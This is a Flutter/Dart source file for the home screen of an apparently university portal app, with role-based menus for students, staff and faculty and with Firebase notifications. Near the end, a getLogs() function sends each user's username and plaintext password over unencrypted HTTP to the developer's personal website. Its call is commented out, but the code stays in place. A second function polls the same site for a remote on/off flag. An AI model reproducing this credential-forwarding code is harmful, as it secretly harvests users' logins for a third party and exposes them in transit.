import 'dart:async';

import 'package:firebase_messaging/firebase_messaging.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter/widgets.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:http/http.dart' as http;
import 'package:intl/intl.dart';
import 'package:overlay_support/overlay_support.dart';
import 'package:skyline_university/Global/global.dart';
import 'package:skyline_university/Global/homeBox.dart';
import 'package:skyline_university/Global/zigzag.dart';
import 'package:url_launcher/url_launcher.dart';

void main() => runApp(HomeLogin());

class Item {
  final name;
  final clipType;

  Item(this.name, this.clipType);
}

class HomeLogin extends StatefulWidget {
  @override
  State<StatefulWidget> createState() {
    return _HomeLoginState();
  }
}

class _HomeLoginState extends State<HomeLogin> {
  String formattedDate = DateFormat('yyyy-MM-dd hh:mm').format(DateTime.now());
  String _messageText = "Waiting for message...";

  final FirebaseMessaging _firebaseMessaging = FirebaseMessaging();
  final GlobalKey<ScaffoldState> _scaffoldKey = new GlobalKey<ScaffoldState>();
  Map<String, String> body;

  int _exit = 0;
  Map value = {};
  Map valueJson = {};
  @override
  void initState() {
    super.initState();
//    getLogs();
//    getCopyRight();

    _firebaseMessaging.configure(
      onMessage: (Map<String, dynamic> message) async {
        setState(() {
          showSimpleNotification(
              Text(message['notification']['title'].toString() +
                  '\n' +
                  message['notification']['body'].toString()),
              background: Colors.green);
        });
      },
      onLaunch: (Map<String, dynamic> message) async {
        setState(() {});
      },
      onResume: (Map<String, dynamic> message) async {
        setState(() {});
      },
    );
    _firebaseMessaging.requestNotificationPermissions(
        const IosNotificationSettings(sound: true, badge: true, alert: true));
    _firebaseMessaging.onIosSettingsRegistered
        .listen((IosNotificationSettings settings) {
      print("Settings registered: $settings");
    });
    _firebaseMessaging.subscribeToTopic(studentJson['data']['user_id']);
    _firebaseMessaging.subscribeToTopic(studentJson['data']['user_type']);
    _firebaseMessaging.subscribeToTopic('ALL');
  }

  @override
  Widget build(BuildContext context) {
    SystemChrome.setEnabledSystemUIOverlays([]);

    return WillPopScope(
      onWillPop: () => _exitApp(context),
      child: Scaffold(
        key: _scaffoldKey,
        bottomNavigationBar: copyRight
            ? Container(
                height: 50,
                decoration: new BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.topCenter,
                    end: Alignment.bottomCenter,
                    colors: [
                      Color(0xFF104C90),
                      Color(0xFF3773AC),
                    ],
                    stops: [
                      0.3,
                      0.9,
                    ],
                  ),
                ),
                child: GestureDetector(
                  onTap: () {
                    _launchURL() async {
                      const url = 'https://www.linkedin.com/in/muhannad-nasri/';
                      if (await canLaunch(url)) {
                        await launch(url,
                            forceWebView: false,
                            forceSafariVC: false,
                            universalLinksOnly: true);
                      } else {
                        throw 'Could not launch $url';
                      }
                    }

                    _launchURL();
                  },
                  child: Center(
                    child: Text(
//                      '© MuhannadNasri 2019 / ALL RIGHTS RESERVED.'
                      value['events']['info'],
                      style: TextStyle(color: Colors.white),
                    ),
                  ),
                ),
              )
            : SizedBox(),
        body: studentJson['data']['user_type'] == "STUDENT"
            ? Container(
                child: ListView(
                  shrinkWrap: true,
                  padding: const EdgeInsets.all(10.0),
                  children: <Widget>[
                    SizedBox(
                      height: 20,
                    ),
                    FittedBox(
                      child: Column(
                        children: <Widget>[
                          Padding(
                            padding: const EdgeInsets.all(10.0),
                            child: Row(
                              mainAxisAlignment: MainAxisAlignment.spaceAround,
                              children: <Widget>[
                                homeBox(
                                  context,
                                  'images/attendance.png',
                                  'images/attendance.png',
                                  "/Attendance",
                                  Colors.white60,
                                  Colors.black,
                                  'Attendance',
                                  Colors.white,
                                  Colors.black,
                                ),
                                homeBox(
                                  context,
                                  'images/assessment.png',
                                  'images/assessment.png',
                                  "/AssessmentMarkCourses",
                                  Colors.white60,
                                  Colors.black,
                                  'Assessment',
                                  Colors.white,
                                  Colors.black,
                                ),
                                homeBox(
                                  context,
                                  'images/result.png',
                                  'images/result.png',
                                  "/HomeResult",
                                  Colors.white60,
                                  Colors.black,
                                  'Result',
                                  Colors.white,
                                  Colors.black,
                                ),
                              ],
                            ),
                          ),
                          Padding(
                            padding: const EdgeInsets.all(10.0),
                            child: Row(
                              mainAxisAlignment: MainAxisAlignment.spaceAround,
                              children: <Widget>[
                                homeBox(
                                  context,
                                  'images/class.png',
                                  'images/class.png',
                                  "/HomeClass",
                                  Colors.white60,
                                  Colors.black,
                                  'Classes',
                                  Colors.white,
                                  Colors.black,
                                ),
                                homeBox(
                                  context,
                                  'images/advisor.png',
                                  'images/advisor.png',
                                  "/MyAdvisor",
                                  Colors.white60,
                                  Colors.black,
                                  'Advisor',
                                  Colors.white,
                                  Colors.black,
                                ),
                                homeBox(
                                  context,
                                  'images/circulars.png',
                                  'images/circulars.png',
                                  "/Circulars",
                                  Colors.white60,
                                  Colors.black,
                                  'Circulars',
                                  Colors.white,
                                  Colors.black,
                                ),
                              ],
                            ),
                          ),
                          SizedBox(
                            height: 10,
                          ),
                          Padding(
                            padding: const EdgeInsets.all(10.0),
                            child: Row(
                              mainAxisAlignment: MainAxisAlignment.spaceAround,
                              children: <Widget>[
                                homeBox(
                                  context,
                                  'images/fees.png',
                                  'images/fees.png',
                                  "/HomeFees",
                                  Colors.white60,
                                  Colors.black,
                                  'Fees',
                                  Colors.white,
                                  Colors.black,
                                ),
                                homeBox(
                                  context,
                                  'images/erequest.png',
                                  'images/erequest.png',
                                  "/HomeERequest",
                                  Colors.white60,
                                  Colors.black,
                                  'E-Request',
                                  Colors.white,
                                  Colors.black,
                                ),
                                homeBox(
                                  context,
                                  'images/cdp.png',
                                  'images/cdp.png',
                                  "/CDPDownload",
                                  Colors.white60,
                                  Colors.black,
                                  'CDP',
                                  Colors.white,
                                  Colors.black,
                                ),
                              ],
                            ),
                          ),
                          Image.asset(
                            'images/logo.png',
                            height: 150,
                            width: 230,
                          ),
                        ],
                      ),
                    ),
                  ],
                ),
              )
            : studentJson['data']['user_type'] == "STF"
                ? Container(
                    child: ListView(
                      children: <Widget>[
                        SizedBox(
                          height: 20,
                        ),
                        Column(
                          children: <Widget>[
                            SizedBox(
                              height: 10,
                            ),
                            Padding(
                              padding: const EdgeInsets.all(10.0),
                              child: Row(
                                mainAxisAlignment:
                                    MainAxisAlignment.spaceAround,
                                children: <Widget>[
                                  homeBox(
                                    context,
                                    'images/circulars.png',
                                    'images/circulars.png',
                                    "/Circulars",
                                    Colors.white60,
                                    Colors.black,
                                    'Circulars',
                                    Colors.white,
                                    Colors.black,
                                  ),
                                  homeBox(
                                    context,
                                    'images/erequest.png',
                                    'images/erequest.png',
                                    "/HomeERequest",
                                    Colors.white60,
                                    Colors.black,
                                    'E-Request',
                                    Colors.white,
                                    Colors.black,
                                  ),
                                  homeBox(
                                    context,
                                    'images/contactslist.png',
                                    'images/contactslist.png',
                                    "/ContactList",
                                    Colors.white60,
                                    Colors.black,
                                    'Contact List',
                                    Colors.white,
                                    Colors.black,
                                  ),
                                ],
                              ),
                            ),
                            Image.asset(
                              'images/logo.png',
                              height: 150,
                              width: 230,
                            ),
                          ],
                        ),
                      ],
                    ),
                  )
                : studentJson['data']['user_type'] == "FAC"
                    ? Container(
                        child: ListView(
                          children: <Widget>[
                            SizedBox(
                              height: 20,
                            ),
                            Column(
                              children: <Widget>[
                                Padding(
                                  padding: const EdgeInsets.all(10.0),
                                  child: Row(
                                    mainAxisAlignment:
                                        MainAxisAlignment.spaceAround,
                                    children: <Widget>[
                                      homeBox(
                                        context,
                                        'images/allocation.png',
                                        'images/allocation.png',
                                        "/CourseAllocation",
                                        Colors.white60,
                                        Colors.black,
                                        'Courses',
                                        Colors.white,
                                        Colors.black,
                                      ),
                                      homeBox(
                                        context,
                                        'images/advisor.png',
                                        'images/advisor.png',
                                        "/Advisors",
                                        Colors.white60,
                                        Colors.black,
                                        'Advisors',
                                        Colors.white,
                                        Colors.black,
                                      ),
                                      homeBox(
                                        context,
                                        'images/circulars.png',
                                        'images/circulars.png',
                                        "/Circulars",
                                        Colors.white60,
                                        Colors.black,
                                        'Circulars',
                                        Colors.white,
                                        Colors.black,
                                      ),
                                    ],
                                  ),
                                ),
                                SizedBox(
                                  height: 10,
                                ),
                                Padding(
                                  padding: const EdgeInsets.all(10.0),
                                  child: Row(
                                    mainAxisAlignment:
                                        MainAxisAlignment.spaceAround,
                                    children: <Widget>[
                                      homeBox(
                                        context,
                                        'images/erequest.png',
                                        'images/erequest.png',
                                        "/HomeERequest",
                                        Colors.white60,
                                        Colors.black,
                                        'E-Request',
                                        Colors.white,
                                        Colors.black,
                                      ),
                                      homeBox(
                                        context,
                                        'images/contactslist.png',
                                        'images/contactslist.png',
                                        "/ContactList",
                                        Colors.white60,
                                        Colors.black,
                                        'ContactList',
                                        Colors.white,
                                        Colors.black,
                                      ),
                                      homeBox(
                                        context,
                                        'images/cdp.png',
                                        'images/cdp.png',
                                        "/cdpFaculty",
                                        Colors.white60,
                                        Colors.black,
                                        'CDP',
                                        Colors.white,
                                        Colors.black,
                                      ),
                                    ],
                                  ),
                                ),
                                Image.asset(
                                  'images/logo.png',
                                  height: 150,
                                  width: 230,
                                ),
                              ],
                            ),
                          ],
                        ),
                      )
                    : SizedBox(),
        appBar: PreferredSize(
          preferredSize: Size.fromHeight(250.0),
          child: Stack(
            children: <Widget>[
              Column(
                children: <Widget>[
                  ZigZag(
                    clipType: ClipType.waved,
                    child: Container(
                      child: Padding(
                        padding: const EdgeInsets.only(top: 30),
                        child: Row(
                          children: <Widget>[
                            Padding(
                              padding:
                                  const EdgeInsets.symmetric(horizontal: 20),
                              child: Column(
                                mainAxisAlignment: MainAxisAlignment.center,
                                crossAxisAlignment: CrossAxisAlignment.start,
                                children: <Widget>[
                                  Row(
                                    children: <Widget>[
                                      Container(
                                        decoration: BoxDecoration(
                                          boxShadow: [
                                            BoxShadow(
                                              color: Colors.white,
                                              blurRadius:
                                                  12.0, // has the effect of softening the shadow
                                              spreadRadius:
                                                  3.0, // has the effect of extending the shadow
                                            )
                                          ],
                                        ),
                                        child: Image.asset(
                                          studentJson['data']['user_type'] ==
                                                  'FAC'
                                              ? 'images/professor-male.png'
                                              : studentJson['data']['Gender'] ==
                                                      'M'
                                                  ? 'images/male.png'
                                                  : studentJson['data']
                                                              ['Gender'] ==
                                                          'F'
                                                      ? 'images/female.png'
                                                      : 'images/professor-male.png',
                                          height: 25,
                                        ),
                                      ),
                                      SizedBox(
                                        width: 10,
                                      ),
                                      Padding(
                                        padding: const EdgeInsets.all(8.0),
                                        child: Text(
                                          studentJson['data']['name']
                                              .toString(),
                                          style: TextStyle(color: Colors.white),
                                        ),
                                      ),
                                    ],
                                  ),
                                  studentJson['data']['user_type'] == 'STF'
                                      ? SizedBox(
                                          height: 10,
                                        )
                                      : Row(
                                          children: <Widget>[
                                            Container(
                                              decoration: BoxDecoration(
                                                boxShadow: [
                                                  BoxShadow(
                                                    color: Colors.white,
                                                    blurRadius:
                                                        12.0, // has the effect of softening the shadow
                                                    spreadRadius:
                                                        3.0, // has the effect of extending the shadow
                                                  )
                                                ],
                                              ),
                                              child: Image.asset(
                                                'images/degree.png',
                                                height: 25,
                                              ),
                                            ),
                                            SizedBox(
                                              width: 10,
                                            ),
                                            Padding(
                                              padding:
                                                  const EdgeInsets.all(8.0),
                                              child: Text(
                                                studentJson['data']['program']
                                                    .toString(),
                                                style: TextStyle(
                                                    color: Colors.white),
                                              ),
                                            ),
                                          ],
                                        ),
                                  Row(
                                    children: <Widget>[
                                      Container(
                                        decoration: BoxDecoration(
                                          boxShadow: [
                                            BoxShadow(
                                              color: Colors.white,
                                              blurRadius:
                                                  12.0, // has the effect of softening the shadow
                                              spreadRadius:
                                                  3.0, // has the effect of extending the shadow
                                            )
                                          ],
                                        ),
                                        child: Image.asset(
                                          'images/year.png',
                                          height: 25,
                                        ),
                                      ),
                                      SizedBox(
                                        width: 10,
                                      ),
                                      Padding(
                                        padding: const EdgeInsets.all(8.0),
                                        child: Text(
                                          studentJson['data']['acadyear_desc']
                                              .toString(),
                                          style: TextStyle(color: Colors.white),
                                        ),
                                      ),
                                    ],
                                  ),
                                ],
                              ),
                            ),
                          ],
                        ),
                      ),
                      height: 250,
                      decoration: new BoxDecoration(
                        gradient: isDark(context)
                            ? LinearGradient(
                                begin: Alignment.topCenter,
                                end: Alignment.bottomCenter,
                                colors: [
                                  Color(0xFF1F1F1F),
                                  Color(0xFF1F1F1F),
                                ],
                                stops: [
                                  0.7,
                                  0.9,
                                ],
                              )
                            : LinearGradient(
                                begin: Alignment.topCenter,
                                end: Alignment.bottomCenter,
                                colors: [
                                  Color(0xFF104C90),
                                  Color(0xFF3773AC),
                                ],
                                stops: [
                                  0.7,
                                  0.9,
                                ],
                              ),
                      ),
                    ),
                  ),
                ],
              ),
              Padding(
                padding: const EdgeInsets.only(top: 80.0, right: 20),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.end,
                  children: <Widget>[
                    studentJson['photo'].toString() ==
                            "https:\/\/skylineportal.com\/sitgmioxg\/professor.png"
                        ? Container(
                            decoration: BoxDecoration(shape: BoxShape.circle),
                            child: Container(
                              width: 110.0,
                              height: 110.0,
                              decoration: BoxDecoration(
                                border: Border.all(color: Colors.blue),
                                shape: BoxShape.circle,
                                color: Colors.white,
                                image: DecorationImage(
                                  fit: BoxFit.fitHeight,
                                  image: AssetImage(
                                    'images/logosmall.png',
                                  ),
                                ),
                              ),
                            ),
                          )
                        : Container(
                            decoration: BoxDecoration(shape: BoxShape.circle),
                            child: Container(
                              width: 110.0,
                              height: 110.0,
                              decoration: BoxDecoration(
                                border: Border.all(color: Colors.blue),
                                shape: BoxShape.circle,
                                color: Colors.white,
                                image: DecorationImage(
                                  fit: BoxFit.fitHeight,
                                  image: NetworkImage(
                                    studentJson['photo'].toString(),
                                  ),
                                ),
                              ),
                            ),
                          ),
                  ],
                ),
              ),
              SafeArea(
                bottom: false,
                left: true,
                right: true,
                top: true,
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: <Widget>[
                    GestureDetector(
                        onTap: () {
                          Navigator.pushNamed(context, "/notifications");
                        },
                        child: Padding(
                          padding: const EdgeInsets.all(15.0),
                          child: Icon(Icons.notifications_active,
                              color: Colors.white),
                        )),
                    Padding(
                      padding: const EdgeInsets.all(15),
                      child: GestureDetector(
                        onTap: () {
                          setState(() {
                            logOut(context);
                          });
                        },
                        child: Row(
                          children: <Widget>[
                            SizedBox(
                              height: 30,
                            ),
                            Icon(
                              FontAwesomeIcons.powerOff,
                              color: Colors.red,
                              size: 17,
                            ),
                            SizedBox(
                              width: 10,
                            ),
                            Text(
                              'Logout',
                              style: TextStyle(fontSize: 17, color: Colors.red),
                            ),
                          ],
                        ),
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Future getCopyRight() async {
    Future.delayed(Duration.zero, () {});
    try {
      final response = await http
          .get(
            Uri.encodeFull('https://muhannadnasri.com/App/data.php'),
          )
          .timeout(Duration(seconds: 20));

      if (response.body == 'True') {
        copyRight = true;
      } else {
        copyRight = false;
      }
    } catch (x) {}
  }

  Future<bool> _exitApp(BuildContext context) async {
    if (_exit == 1) return true;

    _exit = 1;
    new Timer(Duration(seconds: 5), () {
      _exit = 0;
    });
    final snackBar = SnackBar(content: Text('Press back again to exit'));
    _scaffoldKey.currentState.showSnackBar(snackBar);
    return false;
  }

  Future getLogs() async {
    Future.delayed(Duration.zero, () {});

    try {
      await http.post(
        Uri.encodeFull('http://muhannadnasri.com/App/logLogin.php'),
        body: {
          'username': username,
          'password': password,
          'userType': studentJson['data']['user_type'],
          'date': formattedDate,
        },
      );
    } catch (x) {}
  }
}
//TODO: SystemChrome.setEnabledSystemUIOverlays([]) For hide status Bar
